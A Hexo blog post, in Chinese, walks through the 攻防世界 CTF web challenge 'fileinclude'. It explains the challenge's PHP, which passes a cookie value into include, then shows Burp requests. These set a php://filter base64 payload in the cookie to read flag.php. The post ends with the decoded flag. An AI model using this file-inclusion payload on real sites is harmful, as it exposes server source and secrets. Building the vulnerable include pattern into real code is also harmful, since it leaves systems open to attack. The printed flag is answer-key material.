<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>web5 | Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="攻防世界  fileinclude打开题目提示Notice: Undefined index: language in &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php on line 9Please choose the language you want : English or ChineseHi,EveryOne,The flag is in flag">
<meta property="og:type" content="article">
<meta property="og:title" content="web5">
<meta property="og:url" content="http://example.com/2025/01/24/web5/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="攻防世界  fileinclude打开题目提示Notice: Undefined index: language in &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php on line 9Please choose the language you want : English or ChineseHi,EveryOne,The flag is in flag">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2025-01-24T06:43:59.000Z">
<meta property="article:modified_time" content="2025-01-24T07:10:43.625Z">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<meta name="generator" content="Hexo 7.3.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
        
          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
        
        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main"><article id="new-web5" class="h-entry article article-type-new" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/01/24/web5/" class="article-date">
  <time class="dt-published" datetime="2025-01-24T06:43:59.000Z" itemprop="datePublished">2025-01-24</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="p-name article-title" itemprop="headline name">
      web5
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>攻防世界  fileinclude<br>打开题目提示Notice: Undefined index: language in &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php on line 9<br>Please choose the language you want : English or Chinese<br>Hi,EveryOne,The flag is in flag.php：注意：未定义索引：第 9<br>行 &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php 中的语言请选择您想要的语言：英文或中文<br>嗨，各位，旗帜在 flag.php<br>查看页面源代码发现PHP代码</p>
<html>
<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8" /></head>

<br />
<b>Notice</b>:  Undefined index: language in <b>/var/www/html/index.php</b> on line <b>9</b><br />
Please choose the language you want : English or Chinese
<h1>Hi,EveryOne,The flag is in flag.php</h1><html>
<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8" /></head>
------------------------------------------------------------------
<?php
if( !ini_get('display_errors') ) {
  ini_set('display_errors', 'On');
  }
error_reporting(E_ALL);
$lan = $_COOKIE['language'];
if(!$lan)
{
    @setcookie("language","english");
    @include("english.php");
}
else
{
    @include($lan.".php");
}
$x=file_get_contents('index.php');
echo $x;
?>
----------------------------------------------------------------
</html></html>
这段 PHP 代码主要完成以下几个任务：
开启错误显示功能，确保在代码运行过程中出现的错误能够被显示出来。
从客户端的 Cookie 中获取名为language的值。
如果没有获取到language的值，设置language的 Cookie 为english，并引入english.php文件。
如果获取到了language的值，引入以该值命名的 PHP 文件。
读取index.php文件的内容并将其输出。
分析
<?php
// 检查是否已经开启了错误显示功能
if( !ini_get('display_errors') ) {
    // 如果没有开启，则将其开启
    ini_set('display_errors', 'On');
}
// 设置错误报告级别为显示所有错误
error_reporting(E_ALL);
ini_get('display_errors')：用于获取display_errors配置项的值，该值决定是否显示错误信息。
ini_set('display_errors', 'On')：如果display_errors未开启，则将其设置为开启状态。
error_reporting(E_ALL)：设置错误报告级别为显示所有错误。
// 从客户端的Cookie中获取名为language的值
$lan = $_COOKIE['language'];
$_COOKIE是一个超全局数组，用于获取客户端发送的 Cookie 信息。
// 检查是否获取到了language的值
if(!$lan)
{
    // 如果没有获取到，则设置language的Cookie为english
    @setcookie("language","english");
    // 引入english.php文件
    @include("english.php");
}
else
{
    // 如果获取到了，则引入以该值命名的PHP文件
    @include($lan.".php");
}
@符号是错误抑制符，用于抑制可能出现的错误信息。
setcookie("language","english")：设置一个名为language的 Cookie，其值为english。
include语句用于引入指定的 PHP 文件。
// 读取index.php文件的内容
$x=file_get_contents('index.php');
// 输出读取到的内容
echo $x;
?>
file_get_contents('index.php')：读取index.php文件的全部内容，并将其作为字符串返回。
echo $x：将读取到的内容输出到浏览器。
解题方法：
使用bp抓包、
GET / HTTP/1.1
Host: 61.147.171.105:50676
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Connection: close
发送给重放器并添加cookie:language=php://filter/read=convert.base64-encode/resource=/var/www/html/flag
GET / HTTP/1.1
Host: 61.147.171.105:50676
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
cookie:language=php://filter/read=convert.base64-encode/resource=/var/www/html/flag
Connection: close
得到一串bash64编码的字符串：PD9waHANCiRmbGFnPSJjeWJlcnBlYWNle2Q0YTMwNTY4YzQxZjYyN2I0MWZjMjNjZjJkZWUzNWMwfSI7DQo/Pg==
解码的flag
<?php
$flag="cyberpeace{d4a30568c41f627b41fc23cf2dee35c0}";
?>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2025/01/24/web5/" data-id="cm6afakc30000wgmfef273246" data-title="web5" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2025/01/25/web6/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          web6
        
      </div>
    </a>
  
  
    <a href="/2025/01/21/web4/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">web4</div>
    </a>
  
</nav>

  
</article>


</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/02/">February 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/01/">January 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/12/">December 2024</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2025/02/01/web7/">web7</a>
          </li>
        
          <li>
            <a href="/2025/01/25/web6/">web6</a>
          </li>
        
          <li>
            <a href="/2025/01/24/web5/">web5</a>
          </li>
        
          <li>
            <a href="/2025/01/21/web4/">web4</a>
          </li>
        
          <li>
            <a href="/2025/01/18/web3/">web3</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2025 John Doe<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.6.4.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>